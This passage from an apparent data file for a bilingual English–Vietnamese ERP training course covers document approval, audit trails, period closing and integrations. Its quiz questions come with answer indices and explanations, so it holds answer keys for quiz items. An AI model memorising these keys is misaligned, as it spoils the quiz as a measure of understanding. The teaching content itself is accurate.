VI: Chỉ chứng từ nháp mới được sửa hoặc xóa; chứng từ đã ghi sổ được sửa bằng một chứng từ đảo mới.`,questions:[{id:"erp.status-approval.1",kind:"mcq",difficulty:"easy",prompt:`In which status can a user still edit a document freely?
VI: Ở trạng thái nào người dùng còn được sửa chứng từ thoải mái?`,choices:["Approved","Posted","Cancelled","Draft"],answer:3,why:`A draft has not been checked or used yet. Once it is submitted, approved or posted, other people rely on its values.
VI: Chứng từ nháp chưa được duyệt hay sử dụng. Khi đã gửi duyệt, đã duyệt hoặc đã ghi sổ, người khác đã dựa vào các giá trị đó.`},{id:"erp.status-approval.2",kind:"scenario",difficulty:"medium",prompt:`A posted sales invoice has the wrong unit price. A manager asks you to "just fix the number in the database". What do you do?
VI: Hóa đơn bán đã ghi sổ bị sai đơn giá. Quản lý bảo "sửa con số trong database là xong". Bạn làm gì?`,choices:[`Run an UPDATE on the invoice line, then tell accounting
VI: Chạy UPDATE dòng hóa đơn rồi báo kế toán`,`Use the business process for a reversal or adjustment
VI: Làm theo quy trình nghiệp vụ: chứng từ đảo hoặc điều chỉnh`,`Delete the invoice and create a new one with that number
VI: Xóa hóa đơn và lập hóa đơn mới trùng số cũ`,`Change the price on the item so the report looks right
VI: Sửa giá trong danh mục hàng để báo cáo trông đúng`],answer:1,why:`A posted invoice has already changed revenue, debt and tax. Editing it quietly breaks the link to the books and the audit trail. A new correcting document keeps both the mistake and the fix visible.
VI: Hóa đơn đã ghi sổ đã làm thay đổi doanh thu, công nợ và thuế. Sửa ngầm sẽ làm lệch sổ sách và mất dấu vết. Chứng từ điều chỉnh mới giữ lại cả lỗi lẫn cách sửa.`},{id:"erp.status-approval.3",kind:"debug",difficulty:"hard",prompt:`A PO for 150,000,000 VND shows "Approved by: team lead". The team lead limit is 20,000,000 VND. Logs show the PO was 15,000,000 VND when it was approved. What is the bug?
VI: Đơn mua hàng 150 triệu hiện "Người duyệt: trưởng nhóm". Hạn mức của trưởng nhóm là 20 triệu. Log cho thấy lúc duyệt đơn chỉ có 15 triệu. Lỗi ở đâu?`,choices:[`The team lead limit was set too high in the settings
VI: Hạn mức của trưởng nhóm bị cài quá cao`,`The amount was rounded wrongly when the PO was saved
VI: Số tiền bị làm tròn sai khi lưu đơn`,`An approved PO could still be edited with no new approval
VI: Đơn đã duyệt vẫn sửa được mà không cần duyệt lại`,`The director forgot to reject the PO after approval
VI: Giám đốc quên từ chối đơn sau khi đã duyệt`],answer:2,why:`The approval was valid for 15M VND. The system then let someone raise the amount on an approved document. Lock approved documents, or send them back to Draft for a new approval.
VI: Lần duyệt hợp lệ với 15 triệu. Sau đó hệ thống cho người khác tăng số tiền trên chứng từ đã duyệt. Hãy khóa chứng từ đã duyệt, hoặc đưa về nháp để duyệt lại.`},{id:"erp.status-approval.4",kind:"code",difficulty:"medium",prompt:`This function decides if the Delete button is shown. What is wrong with it?
VI: Hàm này quyết định có hiện nút Xóa hay không. Nó sai ở đâu?`,code:{lang:"ts",text:`function canDelete(status: string): boolean {
  return status !== 'Approved';
}`},choices:[`Draft documents can no longer be deleted
VI: Chứng từ nháp không còn xóa được nữa`,`Posted and cancelled documents can be deleted
VI: Chứng từ đã ghi sổ và đã hủy vẫn xóa được`,`Nothing; only approved ones need protection
VI: Không sai; chỉ chứng từ đã duyệt cần bảo vệ`,`It should compare a number, not a string
VI: Nên so sánh số thay vì chuỗi`],answer:1,why:'The rule blocks one status and allows all others, including Posted. Write it as an allow-list: `return status === "Draft"`.\nVI: Quy tắc chặn một trạng thái và cho phép mọi trạng thái khác, kể cả Đã ghi sổ. Hãy viết theo danh sách cho phép: `return status === "Draft"`.'},{id:"erp.status-approval.5",kind:"truefalse",difficulty:"medium",prompt:`Cancelling an approved document should delete its row from the database.
VI: Hủy một chứng từ đã duyệt thì nên xóa dòng đó khỏi cơ sở dữ liệu.`,choices:["True","False"],answer:1,why:`A cancelled document stays, with status Cancelled. People can still see that it existed, who cancelled it and why. Its number is not used again.
VI: Chứng từ đã hủy vẫn được giữ với trạng thái Đã hủy. Mọi người vẫn thấy nó từng tồn tại, ai hủy và vì sao. Số của nó không được dùng lại.`}]},{id:"erp.audit-trail",title:"Audit trail · Nhật ký thay đổi",summary:`Who changed what, and when.
VI: Ai đã sửa gì, vào lúc nào.`,minutes:4,blocks:[{type:"text",text:`An **audit trail** is a log of every important change. It records who, when, which field, the old value and the new value.
VI: **Nhật ký thay đổi** (audit trail) ghi lại mọi thay đổi quan trọng. Nó lưu ai sửa, lúc nào, trường nào, giá trị cũ và giá trị mới.`},{type:"diagram",text:`Item CH01 · field: Price (VND)
┌────────────┬───────┬─────────┬─────────┐
│ When       │ Who   │ Old     │ New     │
├────────────┼───────┼─────────┼─────────┤
│ 03-02 09:14│ lan   │ 1200000 │ 950000  │
│ 03-05 16:40│ minh  │ 950000  │ 1150000 │
└────────────┴───────┴─────────┴─────────┘
 append only: rows are added, never edited`},{type:"text",text:`Accountants and auditors must prove that the numbers are correct. When a number looks strange, they ask: who changed it, and why? Without a log, nobody can answer.
VI: Kế toán và kiểm toán phải chứng minh số liệu là đúng. Khi một con số trông lạ, họ hỏi: ai đã sửa, và vì sao? Không có nhật ký thì không ai trả lời được.`},{type:"example",title:"A changed bank account · Số tài khoản bị đổi",text:`The bank account of a supplier was changed at 09:14. At 10:00, a payment of 300M VND went to the new account. The real supplier never got the money. The audit trail shows which user made the change.
VI: Số tài khoản ngân hàng của một nhà cung cấp bị đổi lúc 09:14. Lúc 10:00, khoản thanh toán 300 triệu chuyển vào tài khoản mới. Nhà cung cấp thật không nhận được tiền. Nhật ký thay đổi cho biết người dùng nào đã sửa.`},{type:"text",text:"**Soft delete** means the row is not removed. It gets a flag such as `IsDeleted = 1`, plus who deleted it and when. Normal screens hide it, but history keeps it.\nVI: **Xóa mềm** (soft delete) nghĩa là không xóa hẳn dòng dữ liệu. Nó được gắn cờ như `IsDeleted = 1`, kèm người xóa và thời điểm xóa. Màn hình thường ẩn nó, nhưng lịch sử vẫn giữ."},{type:"code",code:{lang:"sql",text:`CREATE TABLE AuditLog (
  Id        BIGINT IDENTITY PRIMARY KEY,
  TableName NVARCHAR(100) NOT NULL,
  RecordId  BIGINT        NOT NULL,
  FieldName NVARCHAR(100) NOT NULL,
  OldValue  NVARCHAR(MAX) NULL,
  NewValue  NVARCHAR(MAX) NULL,
  ChangedBy NVARCHAR(100) NOT NULL,
  ChangedAt DATETIME2     NOT NULL
);`}},{type:"list",items:[`Append only: nobody edits or deletes log rows.
VI: Chỉ ghi thêm: không ai được sửa hay xóa dòng nhật ký.`,`Record the real app user, not the shared database login.
VI: Ghi đúng người dùng ứng dụng, không ghi tài khoản database dùng chung.`,`Use the server clock, not the clock on the user PC.
VI: Dùng giờ máy chủ, không dùng giờ trên máy người dùng.`,`Ask for a reason on sensitive changes, such as price or bank account.
VI: Bắt nhập lý do khi sửa dữ liệu nhạy cảm như giá bán hoặc số tài khoản.`]}],remember:`If you cannot say who changed a number and when, accountants cannot trust it.
VI: Nếu không biết ai sửa con số và lúc nào, kế toán không thể tin con số đó.`,questions:[{id:"erp.audit-trail.1",kind:"mcq",difficulty:"easy",prompt:`What must one audit trail record contain?
VI: Một dòng nhật ký thay đổi phải có những gì?`,choices:["Only the new value and the screen name","Only the user name and the date","Who, when, which field, old value, new value","A full copy of the whole database"],answer:2,why:`You need the old and new values to see what changed. You need who and when to know who is responsible. A log without old values cannot rebuild the history.
VI: Cần giá trị cũ và mới để thấy cái gì đã đổi. Cần ai và lúc nào để biết trách nhiệm. Nhật ký không có giá trị cũ thì không dựng lại được lịch sử.`},{id:"erp.audit-trail.2",kind:"scenario",difficulty:"medium",prompt:`A customer says the price on order SO-2026-00031 changed after they agreed on it. There is no change log. What should you add?
VI: Khách nói giá trên đơn SO-2026-00031 bị đổi sau khi hai bên đã thống nhất. Hệ thống không có nhật ký thay đổi. Bạn nên bổ sung gì?`,choices:[`A "LastModified" date column on the order header only
VI: Chỉ thêm cột "ngày sửa cuối" ở phần đầu đơn hàng`,`A field-level audit log with user, time, old and new value
VI: Nhật ký theo từng trường: người sửa, thời điểm, giá trị cũ và mới`,`A daily database backup to compare prices later
VI: Sao lưu database hằng ngày để sau này so sánh giá`,`A rule that only managers can open the order screen
VI: Quy tắc chỉ quản lý được mở màn hình đơn hàng`],answer:1,why:`A last-modified date says that something changed, but not what or who. Daily backups miss changes made and undone within one day. Only a field-level audit log answers the question.
VI: Ngày sửa cuối chỉ cho biết có thay đổi, không cho biết sửa gì và ai sửa. Bản sao lưu hằng ngày bỏ sót các lần sửa trong ngày. Chỉ nhật ký theo từng trường mới trả lời được.`},{id:"erp.audit-trail.3",kind:"debug",difficulty:"hard",prompt:`Every row in the audit log says "Changed by: erp_app". The app has 200 users. What is the likely cause?
VI: Mọi dòng trong nhật ký đều ghi "Người sửa: erp_app". Ứng dụng có 200 người dùng. Nguyên nhân khả năng cao là gì?`,choices:[`All 200 users share one password for the ERP
VI: Cả 200 người dùng chung một mật khẩu ERP`,`The audit table has no index on the user column
VI: Bảng nhật ký không có index trên cột người dùng`,`The log is written before the user has logged in
VI: Nhật ký được ghi trước khi người dùng đăng nhập`,`The trigger logs the shared DB login, not the app user
VI: Trigger ghi tài khoản DB dùng chung, không ghi người dùng`],answer:3,why:"Apps usually connect to the database with one shared login. A trigger (code the database runs on each change) only sees that login. The app must pass the real user, for example through `SESSION_CONTEXT`.\nVI: Ứng dụng thường kết nối database bằng một tài khoản chung. Trigger (đoạn code database tự chạy khi có thay đổi) chỉ thấy tài khoản đó. Ứng dụng phải truyền người dùng thật vào, ví dụ qua `SESSION_CONTEXT`."},{id:"erp.audit-trail.4",kind:"compare",difficulty:"medium",prompt:`Sales staff delete quotes that customers reject. Later, the manager asks how many quotes were lost this year. Which way of deleting is better?
VI: Nhân viên bán hàng xóa các báo giá bị khách từ chối. Sau đó quản lý hỏi năm nay mất bao nhiêu báo giá. Cách xóa nào tốt hơn?`,choices:[`Hard delete: remove the row, a lost quote has no value
VI: Xóa cứng: xóa hẳn dòng, báo giá mất rồi thì vô giá trị`,`Soft delete: keep the row with IsDeleted, DeletedBy, DeletedAt
VI: Xóa mềm: giữ dòng với IsDeleted, DeletedBy, DeletedAt`],answer:1,why:`With soft delete, the rows are still there to count and review. Hard delete loses the answer forever. Many ERPs go further and use a "Lost" status instead of delete.
VI: Xóa mềm thì dữ liệu vẫn còn để đếm và xem lại. Xóa cứng thì mất câu trả lời mãi mãi. Nhiều ERP còn dùng trạng thái "Thất bại" (Lost) thay cho xóa.`},{id:"erp.audit-trail.5",kind:"truefalse",difficulty:"medium",prompt:`A system admin should be able to edit audit log rows to fix typos.
VI: Quản trị hệ thống nên được sửa các dòng nhật ký thay đổi để sửa lỗi chính tả.`,choices:["True","False"],answer:1,why:`If anyone can edit the log, nobody can trust it. The log is append-only. A mistake is corrected by a new change, and that change is logged too.
VI: Nếu ai cũng sửa được nhật ký thì không ai tin được nó. Nhật ký chỉ được ghi thêm. Sai sót được sửa bằng một thay đổi mới, và thay đổi đó cũng được ghi lại.`}]},{id:"erp.periods",title:"Periods and closing · Kỳ kế toán và khóa sổ",summary:`Close the month, lock it, and use the right date.
VI: Khóa sổ cuối tháng và dùng đúng ngày hạch toán.`,minutes:5,blocks:[{type:"text",text:`Accounting splits the **fiscal year** (năm tài chính) into **periods**, usually months. Reports are made per period: revenue for March, stock on 31 March.
VI: Kế toán chia **năm tài chính** thành các **kỳ**, thường là từng tháng. Báo cáo lập theo kỳ: doanh thu tháng 3, tồn kho ngày 31/3.
At **month-end close**, accounting checks the numbers and posts adjustments. Then it **locks** the period. A locked period accepts no new or changed postings.
VI: Khi **khóa sổ cuối tháng**, kế toán kiểm tra số liệu và ghi các bút toán điều chỉnh. Sau đó **khóa** kỳ. Kỳ đã khóa không nhận thêm hay sửa bút toán nào.`},{type:"diagram",text:`Fiscal year 2026 (năm tài chính)
┌───────┬───────┬───────┬───────┬─────
│ Jan   │ Feb   │ Mar   │ Apr   │ ...
│LOCKED │LOCKED │LOCKED │ OPEN  │
└───────┴───────┴───────┴───────┴─────
                            ▲
             today: 8 April │
New postings dated Jan–Mar → blocked`},{type:"list",items:[`All deliveries of the month are invoiced.
VI: Mọi phiếu xuất trong tháng đã có hóa đơn.`,`Bank balances match the bank statements.
VI: Số dư ngân hàng khớp sổ phụ ngân hàng.`,`The stock count matches the system stock.
VI: Số kiểm kê kho khớp tồn kho trên hệ thống.`,`Depreciation and other month-end entries are posted.
VI: Đã ghi khấu hao và các bút toán cuối tháng khác.`,`Only then, lock the period.
VI: Chỉ sau đó mới khóa sổ kỳ.`]},{type:"text",text:`A document has two dates. The **document date** is the date printed on the paper, such as the supplier invoice date. The **posting date** decides which period the numbers land in.
VI: Một chứng từ có hai ngày. **Ngày chứng từ** là ngày in trên giấy tờ, ví dụ ngày trên hóa đơn của nhà cung cấp. **Ngày hạch toán** quyết định số liệu rơi vào kỳ nào.
A **backdated** document is entered today with an older date. In a locked period, it must be blocked.
VI: Chứng từ **lùi ngày** là chứng từ nhập hôm nay nhưng mang ngày cũ. Nếu ngày đó thuộc kỳ đã khóa thì phải chặn lại.`},{type:"example",title:"A late supplier invoice · Hóa đơn mua vào về muộn",text:`A supplier invoice dated 28 March arrives on 5 April. March is already locked. The document date stays 28 March. Often the posting date goes into April, the first open period. The accountant decides the rule, not the developer.
VI: Hóa đơn nhà cung cấp ngày 28/3 về đến công ty ngày 5/4. Tháng 3 đã khóa sổ. Ngày chứng từ vẫn là 28/3. Ngày hạch toán thường đặt vào tháng 4, kỳ đang mở. Kế toán quyết định quy tắc, không phải lập trình viên.`},{type:"code",code:{lang:"sql",text:`-- Block posting into a locked period
IF EXISTS (
  SELECT 1 FROM Periods
  WHERE @PostingDate BETWEEN StartDate
                         AND EndDate
    AND IsLocked = 1)
  THROW 50001, 'Period is locked', 1;`}}],remember:`Locked periods never change, and the posting date decides which period a document hits.
VI: Kỳ đã khóa thì không thay đổi, và ngày hạch toán quyết định chứng từ rơi vào kỳ nào.`,questions:[{id:"erp.periods.1",kind:"mcq",difficulty:"easy",prompt:`What does locking March do?
VI: Khóa sổ tháng 3 có tác dụng gì?`,choices:[`All March documents are deleted to save space
VI: Xóa mọi chứng từ tháng 3 cho nhẹ dữ liệu`,`Nothing can be posted or changed with a March posting date
VI: Không ghi sổ hay sửa được chứng từ có ngày hạch toán tháng 3`,`Users cannot log in until the April period opens
VI: Người dùng không đăng nhập được đến khi mở kỳ tháng 4`,`March reports are hidden from everyone but the director
VI: Báo cáo tháng 3 bị ẩn với mọi người trừ giám đốc`],answer:1,why:`Locking freezes the numbers of March. Reports already sent to the director, the bank or the tax office stay true.
VI: Khóa sổ giữ nguyên số liệu tháng 3. Các báo cáo đã gửi giám đốc, ngân hàng hay cơ quan thuế vẫn đúng.`},{id:"erp.periods.2",kind:"debug",difficulty:"hard",prompt:`The March revenue report printed on 5 April showed 1.20B VND. The same report printed on 20 April shows 1.25B VND. What most likely happened?
VI: Báo cáo doanh thu tháng 3 in ngày 5/4 là 1,20 tỷ. Cùng báo cáo đó in ngày 20/4 là 1,25 tỷ. Khả năng cao chuyện gì đã xảy ra?`,choices:[`The report rounds numbers differently on different days
VI: Báo cáo làm tròn số khác nhau tùy ngày`,`The database cache returned old data on 5 April
VI: Bộ nhớ đệm database trả dữ liệu cũ vào ngày 5/4`,`March was not locked, and backdated invoices went into it
VI: Tháng 3 chưa khóa nên hóa đơn lùi ngày được ghi vào`,`April invoices are always counted in March reports
VI: Hóa đơn tháng 4 luôn được tính vào báo cáo tháng 3`],answer:2,why:`A closed month should never change. Here 50M VND appeared later, so documents were posted with March dates after the report. Lock the period after closing.
VI: Tháng đã khóa sổ thì không được thay đổi. Ở đây có thêm 50 triệu, tức là có chứng từ mang ngày tháng 3 được ghi sau khi in báo cáo. Hãy khóa kỳ ngay sau khi khóa sổ.`},{id:"erp.periods.3",kind:"code",difficulty:"medium",prompt:"This check runs before posting a supplier invoice. Which date should replace `???`?\nVI: Đoạn kiểm tra này chạy trước khi ghi sổ hóa đơn mua vào. Nên dùng ngày nào thay cho `???`?",code:{lang:"ts",text:`if (isLocked(periodOf(inv.???))) {
  throw new Error('Period is locked');
}`},choices:["`documentDate`","`createdAt`","`dueDate`","`postingDate`"],answer:3,why:`The posting date decides which period the entry lands in. A late supplier invoice can have a document date in a locked month. That is normal.
VI: Ngày hạch toán quyết định bút toán rơi vào kỳ nào. Hóa đơn nhà cung cấp về muộn có thể có ngày chứng từ thuộc tháng đã khóa. Điều đó là bình thường.`},{id:"erp.periods.4",kind:"debug",difficulty:"hard",prompt:`A user in Vietnam posts a receipt at 06:30 on 1 April. The report puts it in March. The server stores time in UTC. Why?
VI: Người dùng ở Việt Nam ghi sổ phiếu thu lúc 06:30 ngày 1/4. Báo cáo lại xếp nó vào tháng 3. Máy chủ lưu giờ theo UTC. Vì sao?`,choices:[`The posting date came from UTC time, still 31 March
VI: Ngày hạch toán lấy từ giờ UTC, lúc đó vẫn là 31/3`,`March was not locked, so the system moved it back
VI: Tháng 3 chưa khóa nên hệ thống tự dời về`,`The report sorts receipts by amount, not by date
VI: Báo cáo sắp xếp phiếu thu theo số tiền, không theo ngày`,`Receipts before 08:00 always belong to the day before
VI: Phiếu thu trước 8 giờ luôn thuộc ngày hôm trước`],answer:0,why:`Vietnam is UTC+7, so 06:30 on 1 April is 23:30 on 31 March in UTC. A posting date is a business date. Store it as a plain date in the company time zone.
VI: Việt Nam là UTC+7, nên 06:30 ngày 1/4 là 23:30 ngày 31/3 theo UTC. Ngày hạch toán là ngày nghiệp vụ. Hãy lưu dạng ngày thuần theo múi giờ của công ty.`},{id:"erp.periods.5",kind:"scenario",difficulty:"medium",prompt:`On 10 April, a user tries to post a delivery dated 25 March. March is locked. What should the system do?
VI: Ngày 10/4, người dùng ghi sổ một phiếu xuất ngày 25/3. Tháng 3 đã khóa. Hệ thống nên làm gì?`,choices:[`Post it into March quietly, since the date is real
VI: Âm thầm ghi vào tháng 3 vì ngày đó là thật`,`Unlock March by itself, post it, then lock it again
VI: Tự mở khóa tháng 3, ghi sổ, rồi khóa lại`,`Block it and let accounting decide the right period
VI: Chặn lại và để kế toán quyết định kỳ đúng`,`Change the document date to 10 April without asking
VI: Tự đổi ngày chứng từ thành 10/4 mà không hỏi`],answer:2,why:`The lock protects numbers that were already reported, so code must not get around it. Accounting may post it in April or reopen March with approval. That is a business decision.
VI: Khóa sổ để bảo vệ số liệu đã báo cáo, nên code không được vượt qua. Kế toán có thể ghi vào tháng 4 hoặc mở lại tháng 3 khi có phê duyệt. Đó là quyết định nghiệp vụ.`}]},{id:"erp.reports-integration",title:"Reports and integration · Báo cáo và tích hợp",summary:`Numbers people trust, and systems that talk to the ERP.
VI: Số liệu đáng tin và các hệ thống kết nối với ERP.`,minutes:5,blocks:[{type:"text",text:`**Operational reports** help daily work: open orders, stock on hand, overdue debts. They read live data from the ERP database.
VI: **Báo cáo vận hành** phục vụ công việc hằng ngày: đơn chưa giao, tồn kho hiện tại, công nợ quá hạn. Chúng đọc dữ liệu trực tiếp từ database ERP.
**Analytics** looks at trends over months and years. Heavy queries run on a **data warehouse**: a separate copy built for reports.
VI: **Phân tích** (analytics) xem xu hướng qua nhiều tháng, nhiều năm. Truy vấn nặng chạy trên **kho dữ liệu** (data warehouse): một bản sao riêng dành cho báo cáo.`},{type:"diagram",text:`┌──────────────┐  live   ┌──────────────┐
│ ERP database │───────► │ Operational  │
│ (documents)  │         │ reports      │
└──────┬───────┘         └──────────────┘
       │ nightly copy (ETL)
       ▼
┌──────────────┐         ┌──────────────┐
│ Data         │───────► │ Dashboards,  │
│ warehouse    │         │ KPIs, trends │
└──────────────┘         └──────────────┘`},{type:"text",text:`**ETL** means extract, transform, load: the job that copies data into the warehouse. A **KPI** (key performance indicator) is one number that shows how the business is doing. Every KPI must **tie back** to documents: click it and see the invoices behind it.
VI: **ETL** (trích xuất, biến đổi, nạp) là tác vụ chép dữ liệu sang kho dữ liệu. **KPI** là chỉ số cho biết doanh nghiệp đang làm tốt đến đâu. Mỗi KPI phải **truy về được** chứng từ: bấm vào là thấy các hóa đơn tạo nên con số.`},{type:"example",title:"Two revenue numbers · Hai con số doanh thu",text:`The dashboard shows March revenue of 5.2B VND. Accounting says 5.0B VND. The dashboard counted cancelled invoices and used the order date. Accounting used posted invoices by posting date. Same word, different rules.
VI: Dashboard cho doanh thu tháng 3 là 5,2 tỷ. Kế toán báo 5,0 tỷ. Dashboard tính cả hóa đơn đã hủy và dùng ngày đặt hàng. Kế toán dùng hóa đơn đã ghi sổ theo ngày hạch toán. Cùng một từ, khác quy tắc.`},{type:"diagram",text:`ERP ──► E-invoice provider
        (hóa đơn điện tử)
        send invoice data, get status
ERP ──► Bank
        payment orders to suppliers
ERP ◄── Bank
        statement: money received
ERP ◄── Online shop
        new orders
ERP ──► Online shop
        stock levels and prices`},{type:"list",items:[`Partners retry, so store their reference and make it unique.
VI: Đối tác sẽ gửi lại, nên lưu mã tham chiếu của họ và đặt ràng buộc duy nhất.`,`A partner can be down, so queue the message and try again later.
VI: Đối tác có thể ngừng hoạt động, nên đưa tin vào hàng đợi và gửi lại sau.`,`Codes differ, so map shop product codes to ERP item codes.
VI: Mã khác nhau, nên cần bảng ánh xạ mã sản phẩm của shop với mã hàng ERP.`]},{type:"text",text:`Before you change an ERP, ask the business these questions.
VI: Trước khi sửa ERP, hãy hỏi bộ phận nghiệp vụ các câu sau.`},{type:"list",items:[`Which documents and statuses does it touch?
VI: Ảnh hưởng tới chứng từ và trạng thái nào?`,`What happens to documents that are already posted?
VI: Chứng từ đã ghi sổ thì xử lý thế nào?`,`Does it change closed periods or reported numbers?
VI: Có làm đổi kỳ đã khóa hay số liệu đã báo cáo không?`,`Which reports, KPIs and integrations use this data?
VI: Báo cáo, KPI và tích hợp nào đang dùng dữ liệu này?`,`Who approves the change, and who tests it with real cases?
VI: Ai duyệt thay đổi, ai kiểm thử bằng tình huống thật?`]}],remember:`Every report number must lead back to real documents, and every integration must survive retries.
VI: Mọi con số báo cáo phải truy về được chứng từ thật, và mọi tích hợp phải chịu được việc gửi lại.`,questions:[{id:"erp.reports-integration.1",kind:"perf",difficulty:"medium",prompt:`A 5-year sales trend report runs on the live ERP database at 10:00. While it runs, saving orders is very slow. What is the best fix?
VI: Báo cáo xu hướng bán hàng 5 năm chạy trên database ERP lúc 10 giờ sáng. Trong lúc đó việc lưu đơn rất chậm. Cách sửa tốt nhất là gì?`,choices:[`Ask users to save orders before 10:00 each day
VI: Bảo người dùng lưu đơn trước 10 giờ mỗi ngày`,"Add `NOLOCK` to every query in the ERP code\nVI: Thêm `NOLOCK` vào mọi truy vấn trong code ERP",`Buy faster laptops for the sales team
VI: Mua laptop nhanh hơn cho phòng bán hàng`,`Run it on the data warehouse or a read-only copy
VI: Chạy trên kho dữ liệu hoặc bản sao chỉ đọc`],answer:3,why:"Big trend queries compete with daily work for CPU, memory and locks. Move analytics to a separate copy. `NOLOCK` everywhere risks wrong numbers.\nVI: Truy vấn xu hướng lớn tranh CPU, bộ nhớ và khóa với công việc hằng ngày. Hãy chuyển phần phân tích sang bản sao riêng. Thêm `NOLOCK` khắp nơi dễ cho ra số sai."},{id:"erp.reports-integration.2",kind:"debug",difficulty:"medium",prompt:`The dashboard shows March revenue of 5.2B VND. The accounting report shows 5.0B VND. What should you check first?
VI: Dashboard cho doanh thu tháng 3 là 5,2 tỷ. Báo cáo kế toán là 5,0 tỷ. Bạn nên kiểm tra gì trước?`,choices:[`Which statuses and which date each report uses
VI: Mỗi báo cáo lọc trạng thái nào và dùng ngày nào`,`Whether the dashboard chart colors are correct
VI: Màu biểu đồ trên dashboard có đúng không`,`Whether the server has enough free disk space
VI: Máy chủ còn đủ dung lượng đĩa không`,`Whether accounting typed the report by hand
VI: Kế toán có tự gõ báo cáo bằng tay không`],answer:0,why:`Two numbers for the same word usually mean two different rules. Common causes: cancelled invoices are counted, or the order date is used instead of the posting date. Drill down to the documents that differ.
VI: Hai con số cho cùng một khái niệm thường do hai quy tắc khác nhau. Hay gặp là tính cả hóa đơn đã hủy, hoặc dùng ngày đặt hàng thay vì ngày hạch toán. Hãy đi xuống từng chứng từ bị lệch.`},{id:"erp.reports-integration.3",kind:"scenario",difficulty:"hard",prompt:`The bank sends a "payment received" message. Your API times out, so the bank sends it again. Now the ERP shows the payment twice. What prevents this?
VI: Ngân hàng gửi thông báo "đã nhận tiền". API của bạn bị timeout nên ngân hàng gửi lại. Giờ ERP ghi nhận khoản thanh toán hai lần. Cách nào ngăn được việc này?`,choices:[`Ask the bank never to retry a failed message
VI: Yêu cầu ngân hàng không bao giờ gửi lại tin lỗi`,`Store the bank transaction ID with a unique constraint
VI: Lưu mã giao dịch ngân hàng với ràng buộc duy nhất`,`Make the API timeout longer, for example 5 minutes
VI: Tăng thời gian timeout của API, ví dụ 5 phút`,`Let accounting delete duplicate receipts each week
VI: Để kế toán xóa phiếu thu trùng mỗi tuần`],answer:1,why:`Retries are normal in integrations, so the receiver must be **idempotent**: the same message twice gives one result. A unique bank reference makes the second insert fail safely.
VI: Gửi lại là chuyện bình thường trong tích hợp, nên bên nhận phải **idempotent**: cùng một tin nhận hai lần chỉ cho một kết quả. Mã tham chiếu ngân hàng duy nhất làm lần insert thứ hai thất bại an toàn.`},{id:"erp.reports-integration.4",kind:"scenario",difficulty:"medium",prompt:`Sales asks you to add a "discount %" field on sales invoices. Which question matters most before you write code?
VI: Phòng bán hàng nhờ thêm trường "% chiết khấu" trên hóa đơn bán. Câu hỏi nào quan trọng nhất trước khi viết code?`,choices:[`Should the field label be bold or normal text?
VI: Nhãn của trường nên in đậm hay chữ thường?`,`How does it change tax, posting and the e-invoice?
VI: Nó làm đổi thuế, bút toán và hóa đơn điện tử thế nào?`,`Can the new column go at the end of the table?
VI: Có thể thêm cột mới vào cuối bảng không?`,`Which color should the discount number have?
VI: Con số chiết khấu nên có màu gì?`],answer:1,why:`A discount can change the invoice total, the VAT amount and the accounting entry. It may also change the e-invoice data and sales reports. Agree on these rules before writing code.
VI: Chiết khấu có thể làm đổi tổng tiền, tiền thuế GTGT và bút toán. Nó còn có thể làm đổi dữ liệu hóa đơn điện tử và báo cáo bán hàng. Thống nhất các quy tắc này trước khi viết code.`}]}],cheatSheet:[{title:"Core ideas · Ý tưởng chính",items:[{term:"ERP · Hệ thống ERP",meaning:`One system and one database for the whole company.
VI: Một hệ thống và một cơ sở dữ liệu cho cả công ty.`},{term:"Module · Phân hệ",meaning:`The part of the ERP for one area, such as sales or stock.
VI: Phần của ERP cho một mảng, ví dụ bán hàng hoặc kho.`},{term:"Master data · Dữ liệu danh mục",meaning:`Reused things: customers, items, suppliers, accounts.
VI: Đối tượng dùng lại: khách hàng, mặt hàng, nhà cung cấp, tài khoản.`},{term:"Transaction data · Dữ liệu giao dịch",meaning:`Events: orders, invoices, stock movements.
VI: Nghiệp vụ phát sinh: đơn hàng, hóa đơn, phiếu nhập xuất kho.`},{term:"Inactive · Ngừng theo dõi",meaning:`Hide used master data from new documents; never delete it.
VI: Ẩn danh mục đã dùng khỏi chứng từ mới; không xóa.`}]},{title:"Documents · Chứng từ",items:[{term:"Document · Chứng từ",meaning:`The record of one business event, with a header and lines.
VI: Bản ghi của một nghiệp vụ, gồm phần đầu và các dòng chi tiết.`},{term:"Number series · Dãy số chứng từ",meaning:`A counter per type and year, such as SO-2026-00001.
VI: Bộ đếm theo loại và năm, ví dụ SO-2026-00001.`},{term:"Document flow · Luồng chứng từ",meaning:`Quote → order → delivery → invoice, each copied from the last.
VI: Báo giá → đơn hàng → phiếu xuất → hóa đơn, chứng từ sau chép từ chứng từ trước.`},{term:"Draft · Nháp",meaning:`Can still be edited or deleted.
VI: Còn sửa hoặc xóa được.`},{term:"Posted · Đã ghi sổ",meaning:`Stock and books have changed; the document is locked.
VI: Tồn kho và sổ sách đã thay đổi; chứng từ bị khóa.`},{term:"Reverse · Chứng từ đảo",meaning:`A new document with the opposite effect, to fix a posted one.
VI: Chứng từ mới có tác động ngược lại, để sửa chứng từ đã ghi sổ.`}]},{title:"Control · Kiểm soát",items:[{term:"Approval limit · Hạn mức phê duyệt",meaning:`Above this amount, a higher person must approve.
VI: Vượt số tiền này thì cấp cao hơn phải duyệt.`},{term:"Audit trail · Nhật ký thay đổi",meaning:`Who changed which field, when, with old and new value.
VI: Ai sửa trường nào, lúc nào, giá trị cũ và mới.`},{term:"Soft delete · Xóa mềm",meaning:`Flag the row as deleted and keep it for history.
VI: Gắn cờ đã xóa và giữ lại dòng để tra lịch sử.`},{term:"Period lock · Khóa sổ",meaning:`No new or changed postings in a closed period.
VI: Kỳ đã khóa không nhận thêm hay sửa bút toán.`},{term:"Document date · Ngày chứng từ",meaning:`The date printed on the paper.
VI: Ngày in trên giấy tờ.`},{term:"Posting date · Ngày hạch toán",meaning:`The date that decides the period.
VI: Ngày quyết định chứng từ thuộc kỳ nào.`}]},{title:"Reports and integration · Báo cáo và tích hợp",items:[{term:"Operational report · Báo cáo vận hành",meaning:`Live numbers for daily work.
VI: Số liệu trực tiếp cho công việc hằng ngày.`},{term:"Data warehouse · Kho dữ liệu",meaning:`A separate copy for heavy analytics, loaded on a schedule.
VI: Bản sao riêng cho phân tích nặng, nạp theo lịch.`},{term:"KPI · Chỉ số KPI",meaning:`One key number that must tie back to documents.
VI: Một chỉ số chính, phải truy về được chứng từ.`},{term:"Idempotent · Chống ghi trùng",meaning:`The same message received twice gives one result.
VI: Cùng một tin nhận hai lần chỉ cho một kết quả.`},{term:"E-invoice · Hóa đơn điện tử",meaning:`An invoice issued as electronic data, usually through a provider.
